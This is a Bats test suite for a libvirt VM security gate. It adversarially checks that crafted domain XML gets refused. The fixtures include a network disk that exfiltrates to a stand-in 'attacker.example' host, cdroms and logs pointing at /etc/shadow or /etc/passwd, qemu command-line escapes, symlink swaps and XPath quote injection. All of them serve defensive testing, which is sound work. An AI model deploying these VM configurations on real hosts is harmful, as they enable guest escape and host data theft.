#!/usr/bin/env bats
# Stage 1 (Phase 2) -- the store-gate: live-domain identity (name + UUID + disk + backing) and
# the lifecycle vs guestexec split. This is the security choke point; test it adversarially.

load helpers

setup() {
  dr_vps_test_setup
  dr_vps_load dr_vps_api.sh
  dr_vps_load dr_vps_identity.sh
  dr_vps_load dr_vps_store.sh
  dr_vps_load dr_vps_storage.sh
  dr_vps_load dr_vps_net.sh
  dr_vps_load dr_vps_gate.sh
  dr_vps_store_init
  dr_vps_fake_nft
  cp "$DR_VPS_SRC/../etc/fleet.json" "$BATS_TEST_TMPDIR/fleet.json"
  export DR_VPS_FLEET_JSON="$BATS_TEST_TMPDIR/fleet.json"
  dr_vps_net_apply                                   # write the egress marker (guestexec needs it)
  export FV_XML="$BATS_TEST_TMPDIR/dom.xml" FV_NETXML="$BATS_TEST_TMPDIR/net.xml"
  printf "<network><name>simnet</name><bridge name='drvps0'/><dns enable='no'/><ip address='10.123.0.1'><dhcp><range start='10.123.0.10' end='10.123.0.250'/></dhcp></ip></network>\n" >"$FV_NETXML"
  cat >"$BATS_TEST_TMPDIR/fv" <<'EOF'
#!/usr/bin/env bash
case "$*" in
  *net-dumpxml*) cat "${FV_NETXML:-/dev/null}" ;;    # must precede *dumpxml* (substring)
  *dumpxml*)     cat "${FV_XML:-/dev/null}" ;;
esac
exit 0
EOF
  chmod +x "$BATS_TEST_TMPDIR/fv"; export DR_VIRSH="$BATS_TEST_TMPDIR/fv"
}

# register a golden + an overlay backing it + a vm row; craft the matching live domain xml.
_mkvm() {  # <id> <uuid>
  local id="$1" uuid="$2" aid ov
  [ -f "$DR_VPS_POOL_DIR/g.qcow2" ] || dr_vps_mk_qcow2 "$DR_VPS_POOL_DIR/g.qcow2" 2097152 65536
  aid=$(dr_vps_golden_digest "$DR_VPS_POOL_DIR/g.qcow2")
  dr_vps_store_image_register "$aid" '{"distro":"fedora44"}' "$DR_VPS_POOL_DIR/g.qcow2" 2>/dev/null || true
  ov="$DR_VPS_POOL_DIR/${id}.qcow2"
  qemu-img create -f qcow2 -b "$DR_VPS_POOL_DIR/g.qcow2" -F qcow2 "$ov" >/dev/null 2>&1
  dr_vps_store_vm_create "$id" "$aid" "$ov" "$(dr_vps_net_generation)" 24 "$id" default
  [ -n "$uuid" ] && dr_vps_store_vm_set_uuid "$id" "$uuid"
  # FAITHFUL to a REAL running-domain `virsh dumpxml`: includes the <backingStore> golden, the guest-
  # side <target dev>/<boot dev> names, the NIC's <target dev='vnet0'>, the cdrom seed + pty char devs.
  # (An unfaithful fixture made hostref=0 for the wrong reason and hid the gate.sh:85 refuse-all blocker.)
  printf "<domain type='kvm'><name>%s</name><uuid>%s</uuid><memory unit='MiB'>2048</memory><currentMemory unit='MiB'>2048</currentMemory><vcpu>2</vcpu><resource><partition>/machine</partition></resource><os><type arch='x86_64' machine='q35'>hvm</type><boot dev='hd'/></os><features><acpi/></features><cpu mode='host-model'/><clock offset='utc'/><pm/><on_poweroff>destroy</on_poweroff><on_reboot>restart</on_reboot><on_crash>destroy</on_crash><seclabel type='dynamic' model='selinux' relabel='yes'/><devices><emulator>/usr/bin/qemu-system-x86_64</emulator><disk type='file' device='disk'><driver name='qemu' type='qcow2'/><source file='%s'/><backingStore type='file'><format type='qcow2'/><source file='%s'/><backingStore/></backingStore><target dev='vda' bus='virtio'/></disk><disk type='file' device='cdrom'><source file='%s/%s-seed.iso'/><target dev='sda' bus='sata'/><readonly/></disk><interface type='network'><source network='simnet'/><target dev='vnet0'/><model type='virtio'/><port isolated='yes'/></interface><serial type='pty'><source path='/dev/pts/3'/><target port='0'/></serial><console type='pty' tty='/dev/pts/3'><source path='/dev/pts/3'/><target type='serial' port='0'/></console><input type='mouse' bus='ps2'/><input type='keyboard' bus='ps2'/><audio id='1' type='none'/><watchdog model='itco' action='reset'/><memballoon model='virtio'/></devices></domain>\n" \
    "$id" "$uuid" "$ov" "$DR_VPS_POOL_DIR/g.qcow2" "$DR_VPS_SEED_DIR" "$id" >"$FV_XML"
}

@test "gate: happy guestexec -> trusted tuple overlay|domain|uuid|net|aid" {
  _mkvm vm1 11111111-1111-1111-1111-111111111111
  run dr_vps_gate_vm guestexec vm1; [ "$status" -eq 0 ]   # fixture now carries the real libvirt auto-adds (audio type='none', ps2 inputs, itco watchdog, memballoon)
  [[ "$output" == *"|vm1|11111111-1111-1111-1111-111111111111|simnet|"* ]]
}

@test "gate: a NON-none <audio> (a real host sound channel) is REFUSED for guestexec (live-KVM audio fix; only type='none' is a benign auto-default)" {
  _mkvm vmAUD 1c1c1c1c-1111-1111-1111-111111111111
  sed -i "s/<audio id='1' type='none'\/>/<audio id='1' type='pulseaudio'\/>/" "$FV_XML"
  run dr_vps_gate_vm guestexec vmAUD; [ "$status" -ne 0 ]
  [[ "$output" == *"non-allowlisted"* ]]
}

@test "gate: the @tty exemption is NARROW -- a host @tty NOT on a pty console/serial is still refused (live-KVM tty fix)" {
  _mkvm vmTTY 1d1d1d1d-1111-1111-1111-111111111111
  sed -i "s#<memballoon model='virtio'/>#<memballoon model='virtio' tty='/dev/ttyEVIL'/>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmTTY; [ "$status" -ne 0 ]   # @tty on a non-pty-console element -> host-ref
  [[ "$output" == *"host path/connection"* ]]
}

@test "gate closedshape (Stage-0.C): a valid DEFINED domain is SAFE TO BOOT (GO -> trusted tuple)" {
  _mkvm vmCS 12121212-1111-1111-1111-111111111111
  run dr_vps_gate_vm closedshape vmCS; [ "$status" -eq 0 ]
  [[ "$output" == *"|vmCS|12121212-1111-1111-1111-111111111111|simnet|"* ]]
}

@test "gate closedshape: an /domain/os direct-boot <kernel> host path is REFUSED pre-start" {
  _mkvm vmK 13131313-1111-1111-1111-111111111111
  sed -i "s#<boot dev='hd'/>#<boot dev='hd'/><kernel>/host/vmlinuz</kernel>#" "$FV_XML"
  run dr_vps_gate_vm closedshape vmK; [ "$status" -ne 0 ]
  [[ "$output" == *"/domain/os boot elements"* ]]
}

@test "gate closedshape: a top-level <memoryBacking> host-path subtree is REFUSED pre-start" {
  _mkvm vmMB 14141414-1111-1111-1111-111111111111
  sed -i "s#<features><acpi/></features>#<features><acpi/></features><memoryBacking><hugepages/></memoryBacking>#" "$FV_XML"
  run dr_vps_gate_vm closedshape vmMB; [ "$status" -ne 0 ]
  [[ "$output" == *"top-level /domain element"* ]]
}

@test "gate closedshape: a <hostdev> passthrough device is REFUSED pre-start" {
  _mkvm vmHD 15151515-1111-1111-1111-111111111111
  sed -i "s#<memballoon model='virtio'/>#<memballoon model='virtio'/><hostdev mode='subsystem' type='pci'/>#" "$FV_XML"
  run dr_vps_gate_vm closedshape vmHD; [ "$status" -ne 0 ]
  [[ "$output" == *"non-allowlisted"* ]]
}

@test "gate: shared-helper equivalence -- a seclabel type=none smuggle is refused in BOTH guestexec AND closedshape" {
  _mkvm vmEQ 16161616-1111-1111-1111-111111111111
  sed -i "s#<seclabel type='dynamic' model='selinux' relabel='yes'/>#<seclabel type='none'/>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmEQ;   [ "$status" -ne 0 ]   # live form
  run dr_vps_gate_vm closedshape vmEQ; [ "$status" -ne 0 ]   # inactive form -- same shared sweep, same refusal
}

@test "gate closedshape: the ACTUAL rendered DEFINED XML passes (render+gate compat -- render output is safe to boot)" {
  dr_vps_load dr_vps_domain.sh
  _mkvm vmR 17171717-1111-1111-1111-111111111111
  # feed the REAL render_xml output as the defined domain (what create defines + closedshape then gates)
  dr_vps_domain_render_xml vmR "$DR_VPS_POOL_DIR/vmR.qcow2" "$DR_VPS_SEED_DIR/vmR-seed.iso" \
    simnet 2048 2 17171717-1111-1111-1111-111111111111 host-model >"$FV_XML"
  run dr_vps_gate_vm closedshape vmR; [ "$status" -eq 0 ]
}

@test "gate: unknown id -> 14" {
  run dr_vps_gate_vm lifecycle nope; [ "$status" -eq 14 ]
}

@test "gate: guestexec validates the VM's RECORDED net, not the env DR_VPS_RIG_NET" {
  _mkvm vmNET 1a1a1a1a-1111-1111-1111-111111111111
  dr_vps_store_vm_set_net vmNET simnet                  # recorded net = simnet (matches the live XML)
  DR_VPS_RIG_NET=othernet run dr_vps_gate_vm guestexec vmNET   # watcher's env net DIFFERS from the row
  [ "$status" -eq 0 ]                                   # gate keys to the RECORDED net -> passes
  [[ "$output" == *"|simnet|"* ]]                      # trusted tuple carries the recorded net
  # a LEGACY row (no recorded net) still falls back to the env default, like recreate
  _mkvm vmLEG 2a2a2a2a-2222-2222-2222-222222222222     # _mkvm does not set net -> NULL
  run dr_vps_gate_vm guestexec vmLEG; [ "$status" -eq 0 ]   # env fallback (simnet) matches the XML
}

@test "gate _dr_gate_count: a COMPILE-FAILING xpath -> ERR sentinel, never empty/0 (fail-closed)" {
  # An apostrophe in a spliced path (legal on dev installs, e.g. /home/o'brien/...) breaks the
  # single-quoted XPath string literal so xmllint fails to COMPILE and prints NOTHING. The raw
  # helper + ${x:-0} would turn that into 0 -> a closed-shape count guard passes OPEN. The wrapper
  # must instead yield the non-numeric sentinel ERR, which fails `= 0` / `-ge 1` / `-le 1` closed.
  local xml="<domain><devices><disk device='cdrom'><source file='/x/seed.iso'/></disk></devices></domain>"
  run _dr_gate_count "$xml" "count(//disk[source/@file='/pool/o'brien/seed.iso'])"
  [ "$output" = ERR ]
  run _dr_gate_count "$xml" "count(//disk)"; [ "$output" = 1 ]     # a well-formed count still returns the number
}

@test "gate: leading-dash id -> usage (2), never reaches virsh" {
  run dr_vps_gate_vm lifecycle -rf; [ "$status" -eq 2 ]
}

@test "gate: bad mode -> usage (2)" {
  run dr_vps_gate_vm bogus vm1; [ "$status" -eq 2 ]
}

@test "gate: STALE/unrelated domain -- live UUID != stored -> 24" {
  _mkvm vm2 22222222-2222-2222-2222-222222222222
  sed -i 's/22222222-2222-2222-2222-222222222222/99999999-9999-9999-9999-999999999999/' "$FV_XML"
  run dr_vps_gate_vm lifecycle vm2; [ "$status" -eq 24 ]
}

@test "gate: live disk source != store overlay -> 24" {
  _mkvm vm3 33333333-3333-3333-3333-333333333333
  sed -i "s:<source file='[^']*'/>:<source file='/etc/passwd'/>:" "$FV_XML"
  run dr_vps_gate_vm lifecycle vm3; [ "$status" -eq 24 ]
}

@test "gate: legacy NULL uuid -> guestexec REFUSED (24), lifecycle OK" {
  _mkvm vm4 ""
  run dr_vps_gate_vm guestexec vm4; [ "$status" -eq 24 ]
  run dr_vps_gate_vm lifecycle vm4; [ "$status" -eq 0 ]
}

@test "gate: guestexec on a STALE egress generation -> 24" {
  _mkvm vm5 55555555-5555-5555-5555-555555555555
  jq '.block_cidrs += ["10.250.0.0/24"]' "$DR_VPS_FLEET_JSON" >"$BATS_TEST_TMPDIR/f2" && mv "$BATS_TEST_TMPDIR/f2" "$DR_VPS_FLEET_JSON"
  run dr_vps_gate_vm guestexec vm5; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a domain on simnet PLUS another NIC (only-simnet)" {
  _mkvm vm7 77777777-7777-7777-7777-777777777777
  # add a SECOND interface on the default (NAT) net -> egress bypass -> must refuse
  sed -i "s:</devices>:<interface type='network'><source network='default'/></interface></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vm7; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a non-network (bridge) interface" {
  _mkvm vm8 88888888-8888-8888-8888-888888888888
  sed -i "s:</devices>:<interface type='bridge'><source bridge='br0'/></interface></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vm8; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <hostdev> PCI passthrough (egress bypass class)" {
  _mkvm vm9 99999999-9999-9999-9999-999999999999
  sed -i "s:</devices>:<hostdev mode='subsystem' type='pci'/></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vm9; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses an EXTRA secondary disk (closed storage shape)" {
  _mkvm vmd2 dddddddd-2222-2222-2222-222222222222
  ov="$DR_VPS_POOL_DIR/vmd2.qcow2"
  printf "<domain><uuid>dddddddd-2222-2222-2222-222222222222</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><disk type='file' device='disk'><source file='/var/extra.qcow2'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmd2; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a NETWORK-backed (nbd) secondary disk" {
  _mkvm vmnbd ababababa-3333-3333-3333-333333333333
  ov="$DR_VPS_POOL_DIR/vmnbd.qcow2"
  printf "<domain><uuid>ababababa-3333-3333-3333-333333333333</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><disk type='network' device='disk'><source protocol='nbd' name='leak'><host name='attacker.example' port='10809'/></source></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmnbd; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <qemu:commandline> escape hatch (invisible extra NIC)" {
  _mkvm vmq qqqqqqqq-1111-2222-3333-444444444444
  ov="$DR_VPS_POOL_DIR/vmq.qcow2"
  printf "<domain xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'><uuid>qqqqqqqq-1111-2222-3333-444444444444</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices><qemu:commandline><qemu:arg value='-netdev'/><qemu:arg value='user,id=esc'/></qemu:commandline></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmq; [ "$status" -eq 24 ]
}

@test "gate: overlay attached only as a SECONDARY disk (primary is elsewhere) -> 24" {
  _mkvm vm10 10101010-1010-1010-1010-101010101010
  # make the PRIMARY disk some other file; keep the real overlay as a 2nd disk
  ov="$DR_VPS_POOL_DIR/vm10.qcow2"
  printf "<domain><uuid>10101010-1010-1010-1010-101010101010</uuid><devices><disk type='file' device='disk'><source file='/var/other.qcow2'/></disk><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm lifecycle vm10; [ "$status" -eq 24 ]
}

@test "gate: FULL rig template (overlay + seed cdrom + pty serial/console + simnet) -> tuple" {
  _mkvm vmfull ffff0000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmfull.qcow2"
  printf "<domain><uuid>ffff0000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><disk type='file' device='cdrom'><source file='%s/vmfull-seed.iso'/><readonly/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><serial type='pty'><target port='0'/></serial><console type='pty'/></devices></domain>\n" "$ov" "$DR_VPS_SEED_DIR" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmfull; [ "$status" -eq 0 ]
}

@test "gate: guestexec refuses a cdrom that is NOT the expected seed (host-readable media)" {
  _mkvm vmcd cccc0000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmcd.qcow2"
  printf "<domain><uuid>cccc0000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><disk type='file' device='cdrom'><source file='/etc/shadow'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmcd; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a non-pty (file-backed) serial" {
  _mkvm vmser 5e110000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmser.qcow2"
  printf "<domain><uuid>5e110000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><serial type='file'><source path='/tmp/leak'/></serial></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmser; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <channel> host-comms device" {
  _mkvm vmch c4a10000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmch.qcow2"
  printf "<domain><uuid>c4a10000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><channel type='unix'><source mode='bind'/></channel></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmch; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a SECOND host-readable cdrom (cdrom SET, not just first)" {
  _mkvm vm2cd 2cd00000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vm2cd.qcow2"
  printf "<domain><uuid>2cd00000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><disk type='file' device='cdrom'><source file='%s/vm2cd-seed.iso'/></disk><disk type='file' device='cdrom'><source file='/etc/shadow'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" "$DR_VPS_SEED_DIR" >"$FV_XML"
  run dr_vps_gate_vm guestexec vm2cd; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <graphics> (host display port) -- positive allowlist" {
  _mkvm vmgfx 6f000000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmgfx.qcow2"
  printf "<domain><uuid>6f000000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><controller type='pci'/><memballoon model='virtio'/><graphics type='vnc' port='5900'/></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmgfx; [ "$status" -eq 24 ]
}

@test "gate: guestexec ALLOWS benign libvirt defaults (controller/memballoon/input)" {
  _mkvm vmben be000000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmben.qcow2"
  printf "<domain><uuid>be000000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><controller type='pci'/><memballoon model='virtio'/><input type='mouse'/></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmben; [ "$status" -eq 0 ]
}

@test "gate: guestexec refuses an <rng> egd/udp backend (egress sub-shape) + a host-path <serial><log>" {
  _mkvm vmrng a9000000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmrng.qcow2"
  printf "<domain><uuid>a9000000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><rng model='virtio'><backend model='egd' type='udp'><source mode='connect' host='1.2.3.4' service='1234'/></backend></rng></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmrng; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a host-path <serial><log file=...> (controlled host write)" {
  _mkvm vmlog 109e0000-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmlog.qcow2"
  printf "<domain><uuid>109e0000-0000-0000-0000-000000000000</uuid><devices><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface><serial type='pty'><log file='/tmp/guest-controlled.log'/></serial></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm guestexec vmlog; [ "$status" -eq 24 ]
}

# ---- Observability Step 5: the console-log structural exception (SECURITY CORE) -------------------
# A canonical <serial type='pty'><log file='EXPECTED'/></serial> is ACCEPTED; everything else about a
# <log> fails CLOSED. EXPECTED = $DR_VPS_CONSOLE_LOG_DIR/<id>.log (the gate computes it the same way).
_console_dir() { export DR_VPS_CONSOLE_LOG_DIR="$BATS_TEST_TMPDIR/console"; mkdir -p "$DR_VPS_CONSOLE_LOG_DIR"; }
# Insert the CANONICAL log the way REAL libvirt does. Two faithful facts from a live `virsh dumpxml`:
#  (1) the running-domain serial target drops the isa-serial type -> the fixture serial is <target port='0'/>;
#  (2) libvirt MIRRORS the serial <log file=X> onto the <console> view of serial0 -> a SECOND identical
#      <log file=X> under <console type='pty'> (count(//log)=2, both @file=EXPECTED). This is normal, not an
#      attack -- the gate must accept the mirror. Echoes EXPECTED.
_add_canon_log() {  # <id>
  local id="$1" exp; _console_dir; exp="$DR_VPS_CONSOLE_LOG_DIR/${id}.log"
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='${exp}'/></serial>#" "$FV_XML"
  sed -i "s#</console>#<log file='${exp}'/></console>#" "$FV_XML"
  printf '%s' "$exp"
}

@test "gate STEP5: zero-log VM (pre-observability) still passes guestexec (accept)" {
  _mkvm vmz0 c0000000-0000-0000-0000-000000000000     # _mkvm has NO <log> -> count(//log)=0 -> accept
  run dr_vps_gate_vm guestexec vmz0; [ "$status" -eq 0 ]
}

@test "gate STEP5: the ONE canonical serial-pty <log file=EXPECTED> is ACCEPTED" {
  _mkvm vmc1 c1000000-0000-0000-0000-000000000000
  _add_canon_log vmc1
  run dr_vps_gate_vm guestexec vmc1; [ "$status" -eq 0 ]
  [[ "$output" == *"|vmc1|"* ]]                        # trusted tuple emitted
}

@test "gate STEP5: the legit serial+console MIRROR (2 logs, both @EXPECTED) is ACCEPTED" {
  _mkvm vmc2 c2000000-0000-0000-0000-000000000000
  _add_canon_log vmc2                                              # faithful: serial <log> + console mirror
  [ "$(grep -o '<log' "$FV_XML" | wc -l)" -eq 2 ]                  # confirm the fixture really has the mirror
  run dr_vps_gate_vm guestexec vmc2; [ "$status" -eq 0 ]
}

@test "gate STEP5: a rogue EXTRA <log file=/host> alongside the legit mirror is refused (24)" {
  _mkvm vmc2b c2b00000-0000-0000-0000-000000000000
  _add_canon_log vmc2b                                             # legit serial+console mirror
  sed -i "s#</console>#<log file='/tmp/guest-evil.log'/></console>#" "$FV_XML"   # + a 3rd, host-path log
  run dr_vps_gate_vm guestexec vmc2b; [ "$status" -eq 24 ]
}

@test "gate STEP5: the console mirror with a WRONG @file (not EXPECTED) is refused (24)" {
  _mkvm vmc2c c2c00000-0000-0000-0000-000000000000
  _console_dir
  # serial has the canonical log, but the console 'mirror' points somewhere else -> nbadlog catches it
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='${DR_VPS_CONSOLE_LOG_DIR}/vmc2c.log'/></serial>#" "$FV_XML"
  sed -i "s#</console>#<log file='${DR_VPS_CONSOLE_LOG_DIR}/vmEVIL.log'/></console>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc2c; [ "$status" -eq 24 ]
}

@test "gate STEP5: a <log> with NO @file on the serial is refused (24)" {
  _mkvm vmc7 c7000000-0000-0000-0000-000000000000
  _console_dir
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log/></serial>#" "$FV_XML"   # <log> without @file
  run dr_vps_gate_vm guestexec vmc7; [ "$status" -eq 24 ]
}

@test "gate STEP5: an EXTRA pty serial with <log file=EXPECTED> (beyond serial0+mirror) is refused (24)" {
  _mkvm vmc8 c8000000-0000-0000-0000-000000000000
  exp=$(_add_canon_log vmc8)                              # legit serial0 + its console mirror (2 logs @EXPECTED)
  # inject a SECOND pty serial (port 1) ALSO logging to EXPECTED -> 3 logs; nlog != 1+nmirror -> refuse the
  # fixed-path multiplicity (a shape libvirt never emits; two virtlogd producers aliasing the one console file)
  sed -i "s#</console>#</console><serial type='pty'><target port='1'/><log file='${exp}'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc8; [ "$status" -eq 24 ]
}

@test "gate STEP5: a WRONG @file (not EXPECTED) on the serial log is refused (24)" {
  _mkvm vmc3 c3000000-0000-0000-0000-000000000000
  _console_dir
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='${DR_VPS_CONSOLE_LOG_DIR}/vmOTHER.log'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc3; [ "$status" -eq 24 ]
}

@test "gate STEP5: a <log> on a NON-serial device (console, not serial) is refused (24)" {
  _mkvm vmc4 c4000000-0000-0000-0000-000000000000
  _console_dir
  sed -i "s#</console>#<log file='${DR_VPS_CONSOLE_LOG_DIR}/vmc4.log'/></console>#" "$FV_XML"   # log on console only
  run dr_vps_gate_vm guestexec vmc4; [ "$status" -eq 24 ]
}

@test "gate STEP5: a CROSS-TARGET spoof (2 serial targets split the attrs) is refused (24)" {
  _mkvm vmc5 c5000000-0000-0000-0000-000000000000
  exp=$(_add_canon_log vmc5)
  sed -i "s#<target port='0'/><log#<target type='isa-serial'/><target port='0'/><log#" "$FV_XML"  # 2 targets
  run dr_vps_gate_vm guestexec vmc5; [ "$status" -eq 24 ]
}

@test "gate STEP5: EXPECTED referenced on a DISK source (exemption is node-scoped, not too broad) refused (24)" {
  _mkvm vmc6 c6000000-0000-0000-0000-000000000000
  _console_dir
  # attach a 2nd disk whose source is EXPECTED -- the node-scoped @file exemption must NOT cover a disk source
  sed -i "s#</devices>#<disk type='file' device='disk'><source file='${DR_VPS_CONSOLE_LOG_DIR}/vmc6.log'/><target dev='vdb' bus='virtio'/></disk></devices>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc6; [ "$status" -eq 24 ]
}

@test "gate STEP5: a QUOTE in the console path fails CLOSED (XPath compile-fail, no gate bypass)" {
  _mkvm vmc7 c7000000-0000-0000-0000-000000000000
  export DR_VPS_CONSOLE_LOG_DIR="$BATS_TEST_TMPDIR/con'sole"; mkdir -p "$DR_VPS_CONSOLE_LOG_DIR"
  # render XML-escapes the apostrophe (&apos;) so the XML stays valid; the gate's spliced XPath does not.
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='${BATS_TEST_TMPDIR}/con&apos;sole/vmc7.log'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc7; [ "$status" -ne 0 ]
}

@test "gate STEP5: EXPECTED is a SYMLINK on disk -> refused (post-create swap of the exempt path) (24)" {
  _mkvm vmc8 c8000000-0000-0000-0000-000000000000
  exp=$(_add_canon_log vmc8)
  ln -s /etc/passwd "$exp"                            # the exempt path is a symlink on disk
  run dr_vps_gate_vm guestexec vmc8; [ "$status" -eq 24 ]
}

@test "gate STEP5: live dumpxml swapped to <log file=/etc/shadow> is refused (24)" {
  _mkvm vmc9 c9000000-0000-0000-0000-000000000000
  _console_dir
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='/etc/shadow'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmc9; [ "$status" -eq 24 ]
}

@test "gate STEP5: a SYMLINKED console log DIR (relocated log root) is refused even with canonical XML (24)" {
  _mkvm vmcd cd000000-0000-0000-0000-000000000000
  local real="$BATS_TEST_TMPDIR/realconsole"; mkdir -p "$real"
  export DR_VPS_CONSOLE_LOG_DIR="$BATS_TEST_TMPDIR/console"; ln -s "$real" "$DR_VPS_CONSOLE_LOG_DIR"   # dir is a symlink
  exp="$DR_VPS_CONSOLE_LOG_DIR/vmcd.log"
  sed -i "s#<target port='0'/></serial>#<target port='0'/><log file='${exp}'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmcd; [ "$status" -eq 24 ]   # convergence r1: dir-symlink defense-in-depth
}

@test "gate STEP6: the RENDERER's serial shape (isa-serial target + canonical log) is ACCEPTED" {
  _mkvm vmr6 ca000000-0000-0000-0000-000000000000
  _console_dir; exp="$DR_VPS_CONSOLE_LOG_DIR/vmr6.log"
  # the render form keeps target type='isa-serial' (libvirt MAY normalize it away); the gate must accept
  # both -- @port='0' + count(target)=1 does NOT hinge on the type attr being present or absent.
  sed -i "s#<target port='0'/></serial>#<target type='isa-serial' port='0'/><log file='${exp}'/></serial>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmr6; [ "$status" -eq 0 ]
}

@test "gate: lifecycle does NOT require fresh egress (destroy not blocked by drift)" {
  _mkvm vm6 66666666-6666-6666-6666-666666666666
  jq '.block_cidrs += ["10.251.0.0/24"]' "$DR_VPS_FLEET_JSON" >"$BATS_TEST_TMPDIR/f3" && mv "$BATS_TEST_TMPDIR/f3" "$DR_VPS_FLEET_JSON"
  run dr_vps_gate_vm lifecycle vm6; [ "$status" -eq 0 ]
}

@test "gate: FAITHFUL real-dumpxml shape (target/boot dev + backingStore golden + pty source path) -> guestexec PASS" {
  _mkvm vmf 0fa17ffu-0000-0000-0000-000000000000
  # the _mkvm fixture is now faithful to a running-domain dumpxml; the host-path sweep must NOT trip
  # on guest-side <target dev>/<boot dev>, the identity-bound <backingStore> golden, or the pty pts.
  run dr_vps_gate_vm guestexec vmf; [ "$status" -eq 0 ]
}

@test "gate: guestexec refuses a HOST BLOCK-DEVICE disk (<source dev=/dev/sda>) -> 24" {
  _mkvm vmblk b10cb10c-0000-0000-0000-000000000000
  sed -i "s:<disk type='file' device='disk'>:<disk type='block' device='disk'><source dev='/dev/sda'/>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmblk; [ "$status" -eq 24 ]   # //source/@dev catches a host block device
}

@test "gate: guestexec refuses an UNEXPECTED host file source (not overlay/seed/golden) -> 24" {
  _mkvm vmhf 401dface-0000-0000-0000-000000000000
  sed -i "s:<serial type='pty'>:<disk type='file' device='disk'><source file='/host/secret.img'/><target dev='vdb'/></disk><serial type='pty'>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmhf; [ "$status" -eq 24 ]
}

@test "gate: guestexec on an UNPARSEABLE/empty dumpxml fails CLOSED (24), never fail-open" {
  _mkvm vmbad badbadba-0000-0000-0000-000000000000
  printf '<not-a-domain' >"$FV_XML"                          # malformed XML
  run dr_vps_gate_vm guestexec vmbad; [ "$status" -ne 0 ]
}

